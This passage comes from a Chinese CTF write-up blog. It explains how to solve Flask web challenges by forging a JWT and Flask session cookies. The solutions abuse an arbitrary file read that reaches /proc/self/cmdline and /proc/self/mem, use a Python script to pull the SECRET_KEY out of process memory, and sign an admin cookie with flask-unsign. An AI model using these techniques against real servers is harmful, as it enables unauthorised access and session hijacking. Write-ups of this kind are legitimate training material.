+<p>分析代码后可以发现 <span class="hexo-wm">𝘴​﻿⑶ⅴℯ𝐧．﻿‌𝘀𝘪‍‍𝘵℮‍</span>Cookies <code>auth</code> 的 <code>SECRET_KEY</code> 为 <code>I_LIKE_Aoyama_Nanami</code></p>
+<p>在 <a href="https://jwt.io/">jwt.io</a> 中使用 SEC<span class="hexo-wm">𝒔‍3𝘷ℯ𝘯∙﻿𝒔i‍‍𝘵e﻿</span>RET_KEY 伪造 <code>{"username":"admin"}</code> 字段并重新加密，</p>
+<p>得到伪造后的 <code>auth</code> 如下：</p>
+<p><img src="image-41.png" alt="image-41.png"></p>
+<pre class="language-none"><code class="language-none">auth = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.mJHHgw5KDOeM6Fu5r7KXYUb-chM02YBqsqmTWMAdDR0</code></pre>
+
+<h2 id="3-Payload"><a href="#3-Payload" class="headerlink" title="3. Payload"></a>3. Payload</h2><p>修改 <code>auth</code> 为伪造后的值并访问 <code>/download?filename=yuanshen?qidong!</code>，得到 <code>flag</code></p>
+<p><img src="image-42.png" alt="image-42.png"></p>
+<blockquote>
+<p>Spirit{6bb3de28-1cc8-<span class="hexo-wm">ѕ‌𝟯ⅴℯ𝐧·​ꜱ𝐢‍ｔｅ‌​</span>4af3-babe-43593039f366}</p>
+</blockquote>
+<h1 id="你真的喜欢鸣濑白羽吗"><a href="#你真的喜欢鸣濑白羽吗" class="headerlink" title="你真的喜欢鸣濑白羽吗"></a>你真的喜欢鸣濑白羽吗</h1><p>题目描述：</p>
+<blockquote>
+<p>不是真的喜欢鸣濑白羽(?<span class="hexo-wm">𝘀​‌⑶v℮𝐧．﻿‍𝒔ⅈ‍﻿t𝘦​</span>)的人拿不到flag</p>
+</blockquote>
+<p>打开页面后发现又是一个图库<span class="hexo-wm">ѕ‍‍𝟯veｎ.﻿﻿𝘴ｉ​ｔe​</span>管理下载系统 (？)</p>
+<p><img src="image-43.png" alt="image-43.png"></p>
+<p>但是点击 <code>Download</code> 后跳转至 <code>/download?filename=1.jpg</code> </p>
+<p>发现图片下载不<span class="hexo-wm">𝘀﻿𝟯vℯｎ∙‍sⅈ​‌ｔe﻿﻿</span>下来，显示如下：</p>
+<p><img src="image-44.png" alt="image-44.png"></p>
+<p>猜测服务端代码对<span class="hexo-wm">𝘀​³𝘷𝐞n․‌ꜱi﻿​𝘵𝐞‍‌</span>文件读取方式进行了修改</p>
+<h2 id="1-任意文件读取漏洞-1"><a href="#1-任意文件读取漏洞-1" class="headerlink" title="1. 任意文件读取漏洞"></a>1. 任意文件读取漏洞</h2><p>与上一题相同，<code>/download?filename=xxxx</code> 处仍存在任意<span class="hexo-wm">𝒔‌𝟯ⅴe𝒏•‌𝘴i​𝐭e‌‌</span>文件读取漏洞</p>
+<p>访问 <code>/download?filename=/proc/self/cmdline</code> , 内容如下：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python /app/I_LIKE_Nanami.py</code></pre>
+
+<p>根据服务端代码路径访问 <code>/download?filename=/app/I_LIKE_Nanami.py</code>,</p>
+<p>得到服务端代码如下：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> secrets
+<span class="token keyword">import</span> subprocess
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> session
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+random_string <span class="token operator">=</span> <span class="token string">"I_LIKE_"</span><span class="token operator">+</span>secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"_Aoyama_Nanami"</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> random_string
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>
+    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> response
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    username <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
+    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'1.jpg'</span><span class="token punctuation">)</span>
+    offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'offset'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    length <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'length'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> filename <span class="token operator">==</span> <span class="token string">"xingtie?qidong!"</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span> 
+            output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/readflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"Error executing /readflag: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/images'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> offset <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
+                data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>length<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> data
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"File not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>
+        
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'Server Error: %s'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">"好像有什么错误喵!"</span><span class="token punctuation">,</span> <span class="token number">500</span>
+    
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre>
+<p>分析代码后发现只有满<span class="hexo-wm">s﻿﻿𝟯𝐯𝘦ｎ•﻿​𝒔𝐢﻿​𝐭𝐞‍‍</span>足以下两个条件才能调用 <code>/readflag</code> subprocess 来读取flag：</p>
+<ul>
+<li>python <span class="hexo-wm">ѕ​‍³𝘷𝘦ｎ•​𝐬𝐢﻿​𝘵𝘦​‍</span>flask <code>session</code> 包含 <code>{"username":"admin"}</code> 字段</li>
+<li>filename <span class="hexo-wm">𝘴​𝟯ⅴ𝘦n•​𝒔ｉ‍ｔｅ‌</span>的 GET 传参为 <code>xingtie?qidong!</code></li>
+</ul>
+<h2 id="2-Python-Flask-Session"><a href="#2-Python-Flask-Session" class="headerlink" title="2. Python Flask Session"></a>2. Python Flask Session</h2><p>从 F12 开发人员工具中找到当前 <span class="hexo-wm">𝘀﻿‌⑶v𝐞n∙‌​𝐬𝐢‍𝒕e‌​</span>Cookies <code>session</code> 的值</p>
+<p><img src="image-45.png" alt="image-45.png"></p>
+<pre class="language-none"><code class="language-none">session = eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZRRgdA.WGZwA7J0tKtifRUgBXyh5DmPmzs</code></pre>
+
+<h3 id="2-1-Session-的组成"><a href="#2-1-Session-的组成" class="headerlink" title="2.1 Session 的组成"></a>2.1 Session 的组成</h3><p>Python Flask Session 通常是一个很长的字符串，中间用两个 <code>.</code> 分隔成三个部分（如果使用了zlib compress，则开头会多出一个 <code>.</code>，该部分归属于Session Data内），依次为：</p>
+<ul>
+<li>Session Data（ <span class="hexo-wm">𝘀‌𝟯𝒗ｅ𝒏∙‍𝒔𝘪​​𝘵℮‌</span>Session 数据 ）</li>
+<li>Timesta<span class="hexo-wm">𝘴﻿3𝐯𝐞𝒏．‍​𝒔ⅈ‌﻿𝘵℮﻿</span>mp（ 时间戳 ）</li>
+<li>Cryptographic <span class="hexo-wm">s‍𝟯vℯ𝐧•​‍𝐬𝐢‌‍𝐭𝐞‍</span>Hash（ 签名 ）</li>
+</ul>
+<p>该字符串应形如：Session Data.<span class="hexo-wm">𝘀​﻿⑶𝐯𝐞n．﻿​𝐬ⅈ‌‌t𝐞‌​</span>Timestamp.Cryptographic Hash</p>
+<p>下面将分别解释三个部分<span class="hexo-wm">ѕ﻿‍³𝘷𝘦𝘯.​‌𝘴𝐢‍﻿𝒕𝘦﻿‌</span>的内容及其作用：</p>
+<h4 id="2-1-1-Session-Data"><a href="#2-1-1-Session-Data" class="headerlink" title="2.1.1 Session Data"></a>2.1.1 Session Data</h4><p>Session Data 部分是一个 <span class="hexo-wm">𝘀﻿‍³ve𝐧.﻿‌𝘀𝐢​𝒕𝘦​‌</span>JSON 对象，用来存放实际需要传递的数据</p>
+<p>Session 在生成时会根据使用 zlib <span class="hexo-wm">𝒔‍​𝟯𝒗℮n.​‌𝘴ⅈ​ｔ℮﻿‌</span>compress 能否减少 Session Data 部分的长度</p>
+<p>来选择性地使用 zlib compress <span class="hexo-wm">𝐬‍3ⅴ𝘦n·‍𝘴i‍﻿t𝘦​﻿</span>( 使用的标志是Session Data 以 <code>.</code> 开头 )</p>
+<p>由于该部分可以通过 <code>Base64URL</code> 进行解密并被读取，<span class="hexo-wm">𝐬‌‍³𝐯e𝘯．‌‍ѕi‌‌t𝐞​​</span>此处一般不存放密文</p>
+<p>这个 JSON <span class="hexo-wm">𝐬‌‍𝟯ⅴ𝐞n∙​‌𝐬𝐢​﻿𝘵𝘦‌‌</span>对象最后也要使用 <code>Base64URL</code> 算法（详见后文）转成字符串</p>
+<h4 id="2-1-2-Timestamp"><a href="#2-1-2-Timestamp" class="headerlink" title="2.1.2 Timestamp"></a>2.1.2 Timestamp</h4><p>Timestamp 部分通常由 Session <span class="hexo-wm">s‍​3𝐯𝐞n·‍​𝐬𝘪‌te﻿​</span>生成时间的时间戳构成</p>
+<p>该时间戳最后会被转化为字节形式并使用 <code>Base64URL</code> 算法（详见后<span class="hexo-wm">𝘴‌﻿³𝘷𝘦𝒏．﻿​𝘀ｉ﻿t𝘦‌</span>文）进行加密</p>
+<h4 id="2-1-3-Cryptograhpic-Hash"><a href="#2-1-3-Cryptograhpic-Hash" class="headerlink" title="2.1.3 Cryptograhpic Hash"></a>2.1.3 Cryptograhpic Hash</h4><p><code>Python Flask Session</code> 在生成 <code>Session</code> 的校验签名时</p>
+<p>会先对 <code>secret_key</code> 进行操作</p>
+<p>首先对 <code>secret_key</code> 进行一次 <code>sha1</code> 加密</p>
+<p>并用 <code>"cookie-session"</code>  salt 来 <span class="hexo-wm">s‍3v𝐞𝒏∙﻿ꜱⅈ﻿‌te﻿</span>update 加密后的 <code>secert_key</code></p>
+<p>接着将 <code>Session Data + sep + Timestamp</code> 使用处理完成的 <code>secret_key</code> 进行一次 <code>sha1</code> 加密</p>
+<p>最后将得到的数据使用 <code>Base64URL</code> 算法（详见后文）进行加密</p>
+<h4 id="2-1-4-Base64URL-1"><a href="#2-1-4-Base64URL-1" class="headerlink" title="2.1.4 Base64URL"></a>2.1.4 Base64URL</h4><p>前面提到，将 Session <span class="hexo-wm">ꜱ﻿‍3𝐯en·‌‌s𝐢﻿𝘵ｅ‍</span>Data、Timestamp 和 Cryptograhpic Hash 串型化的算法是 <code>Base64URL</code>，</p>
+<p>该算法跟 <code>Base64</code> 算法基本类似，<span class="hexo-wm">s﻿​⑶ve𝒏.‌𝒔ｉ﻿ｔe‌‍</span>但有一些不同：</p>
+<ul>
+<li>省略通过 <code>Base64</code> 算法得到的 <code>=</code> </li>
+<li>将通过 <code>Base64</code> 算法得到的 <code>+</code> 替换成 <code>-</code> ，<code>/</code> 替换成 <code>_</code></li>
+</ul>
+<p>这是因为 Sessi<span class="hexo-wm">s‍​⑶ven∙‍​𝒔𝘪​𝘵e﻿​</span>on 作为一个 <code>token</code> ，有时会被应用于 URL 中（例如 <code>/?token=xxx</code>）,</p>
+<p>通过 <code>Base64</code> 算法得到的三<span class="hexo-wm">𝘀​‍³𝐯𝐞n．‌​ꜱｉ‍𝐭𝐞‍</span>个字符 ( <code>+</code> 、 <code>/</code> 、 <code>=</code> ) ，在 URL 里面有特殊含义，所以需要进行省略或替换</p>
+<h3 id="2-2-Session-的伪造"><a href="#2-2-Session-的伪造" class="headerlink" title="2.2 Session 的伪造"></a>2.2 Session 的伪造</h3><p>由于服务端代码使<span class="hexo-wm">ꜱ​﻿3v𝐞𝐧․‍ꜱ𝐢﻿ｔ℮‍</span>用了包含随机字符的 <code>random_string</code> 作为 <code>SECRET_KEY</code>,</p>
+<p>而 Session 的 <code>Cryptographic Hash</code> 需要使用 SECRE<span class="hexo-wm">s‍3𝘷𝘦𝘯․​𝒔𝐢﻿‍ｔ𝘦﻿</span>T_KEY 作为密钥，</p>
+<p>因此在伪造 Session 前我们需要先利用任意文件读取漏洞获取 <code>SECRET_KEY</code></p>
+<p>由于 Python Flask 在运行时会将 <span class="hexo-wm">s​​⑶𝘷𝘦𝒏·‍𝒔𝐢‍te‍‍</span>SECRET_KEY 写入内存中，</p>
+<p>我们可以利用任意文件读取漏洞读取内存来获得 <span class="hexo-wm">ѕ​𝟯𝘷e𝐧·‍‌𝒔ｉ​‌𝐭e‌‍</span>SECRET_KEY</p>
+<p>Python <span class="hexo-wm">s﻿³vℯ𝐧•​𝐬ⅈ﻿﻿𝒕ｅ​</span>内存读取脚本如下</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+
+url <span class="token operator">=</span> <span class="token punctuation">(</span>SpiritCTF Server URL <span class="token keyword">with</span> port<span class="token punctuation">)</span>
+
+rw <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+map_list <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/download?filename=/proc/self/maps"</span></span><span class="token punctuation">)</span>
+map_list <span class="token operator">=</span> map_list<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> map_list<span class="token punctuation">:</span>
+    map_addr <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r"([a-z0-9]+)-([a-z0-9]+) r"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> map_addr<span class="token punctuation">:</span>
+        start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>map_addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+        end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>map_addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+        rw<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end <span class="token operator">-</span> start<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> k <span class="token keyword">in</span> rw<span class="token punctuation">:</span>
+    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/download?filename=/proc/self/mem&amp;offset=</span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">&amp;length=</span><span class="token interpolation"><span class="token punctuation">{</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        secret_key <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"I_LIKE_[a-f0-9]{32}_Aoyama_Nanami"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> secret_key<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SECRET_KEY = \""</span> <span class="token operator">+</span> secret_key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\""</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span></code></pre>
+<p>运行脚本后得到：</p>
+<pre class="language-none"><code class="language-none">SECRET_KEY = "I_LIKE_f9d2e4914fec5f9f26fad0a0e4da3afe_Aoyama_Nanami"</code></pre>
+
+<p>使用 <a href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a> 工具对 Session 进行伪造并签名</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">flask-unsign <span class="token parameter variable">--sign</span> <span class="token parameter variable">--cookie</span> <span class="token string">"{'username': 'admin'}"</span> <span class="token parameter variable">--secret</span> <span class="token string">'I_LIKE_f9d2e4914fec5f9f26fad0a0e4da3afe_Aoyama_Nanami'</span></code></pre>
+<p>得到 Sessi<span class="hexo-wm">s‌﻿⑶𝒗𝘦𝒏.‍​𝘴i‍𝐭𝐞‌﻿</span>on 如下：</p>
+<pre class="language-none"><code class="language-none">eyJ1c2VybmFtZSI6ImFkbWluIn0.ZRRqXA.6kG8cNrvnCI73R2nxAF8iOSA6Ko</code></pre>
+
+<p>修改Cookies <code>Session</code> 并访问 <code>/download?filename=xingtie?qidong!</code>，得到 <code>flag</code></p>
+<p><img src="image-46.png" alt="image-46.png"></p>
+<blockquote>
+<p>Spirit{7d05af5f-<span class="hexo-wm">𝘴‌​3𝘷eｎ<span class="hexo-wm">ѕ‌‍⑶𝒗en．‍﻿ꜱ𝐢﻿﻿𝒕ｅ‌﻿</span>•﻿‍𝘀𝘪‍‌ｔｅ​</span>202d-4578-8833-f598ad794b48}</p>
+</blockquote>
+</body></html>
+        </div>
+        
+          <div class="prev-or-next">
+            <div class="post-foot-next">
+              
+            </div>
+            <div class="post-foot-prev">
+              
+                <a href="../2023-geekgame-writeup/" target="_self">
+                  <span>下一页</span>
+                  <i class="iconfont icon-chevronright"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </div>
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="catalog-zoom">
+      <div class="title">目录</div>
+      <div class="catalog-content">
+        
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E4%BB%8B%E7%BB%8D"><span class="toc-text">比赛介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%83%AD%E8%BA%AB%E8%B5%9B%E4%B8%8E%E6%AD%A3%E8%B5%9B"><span class="toc-text">热身赛与正赛</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Signin1"><span class="toc-text">Signin1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Signin2"><span class="toc-text">Signin2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9ADevTools-curl"><span class="toc-text">1. 方法一：DevTools + curl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9ABurp-Suite"><span class="toc-text">2. 方法二：Burp Suite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Flag-%E8%A7%A3%E5%AF%86"><span class="toc-text">3. Flag 解密</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#baby-php"><span class="toc-text">baby_php</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="toc-text">1. 第一部分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E6%9E%84%E9%80%A0%E9%9D%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87-%E4%BB%85%E9%99%90%E4%BA%8E%E6%97%A7%E7%89%88%E6%9C%ACPHP"><span class="toc-text">1.1 构造非字符串参数绕过 (仅限于旧版本PHP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%88%A9%E7%94%A8%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%89%B9%E6%80%A70e%E7%BB%95%E8%BF%87"><span class="toc-text">1.2 利用弱类型特性0e绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8md5%E7%A2%B0%E6%92%9E"><span class="toc-text">1.3 直接使用md5碰撞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="toc-text">2. 第二部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86"><span class="toc-text">3. 第三部分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%B0%8F%E7%9B%B2%E7%82%B9"><span class="toc-text">3.1 小盲点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-Web"><span class="toc-text">ez_Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9A301-Redirect"><span class="toc-text">1. 第一层：301 Redirect</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-curl-%E6%96%B9%E6%B3%95"><span class="toc-text">1.1 curl 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-burp-suite-%E6%96%B9%E6%B3%95"><span class="toc-text">1.2 burp suite 方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9AGET-%E4%BC%A0%E5%8F%82"><span class="toc-text">2. 第二层：GET 传参</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%AC%AC%E4%B8%89%E5%B1%82%EF%BC%9Afile-get-contents-%E5%88%A9%E7%94%A8"><span class="toc-text">3. 第三层：file_get_contents() 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-PS-preg-match-%E7%BB%95%E8%BF%87"><span class="toc-text">3.1 PS: preg_match 绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-Web2"><span class="toc-text">ez_Web2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9Arobots-%E6%B3%84%E9%9C%B2"><span class="toc-text">1. 第一层：robots 泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9A%E5%BC%B1%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-text">2. 第二层：弱密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%AC%AC%E4%B8%89%E5%B1%82%EF%BC%9Afile-put-contents-%E5%88%A9%E7%94%A8"><span class="toc-text">3. 第三层：file_put_contents() 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-HackBar"><span class="toc-text">3.1 HackBar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-curl"><span class="toc-text">3.2 curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-PS-str-replace-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">3.3 PS: str_replace 绕过方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-sql"><span class="toc-text">ez_sql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">1. 读取数据库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%EF%BC%88%E9%BB%98%E8%AE%A4%E7%AC%AC%E4%B8%80%E5%BC%A0%E8%A1%A8%EF%BC%89"><span class="toc-text">2. 读取数据表名（默认第一张表）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%AF%BB%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-%E9%BB%98%E8%AE%A4%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5"><span class="toc-text">3. 读取字段名 (默认第一个字段)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%AF%BB%E5%8F%96-flag-%E5%86%85%E5%AE%B9"><span class="toc-text">4. 读取 flag 内容</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pin-pin-revenge"><span class="toc-text">pin &amp; pin_revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 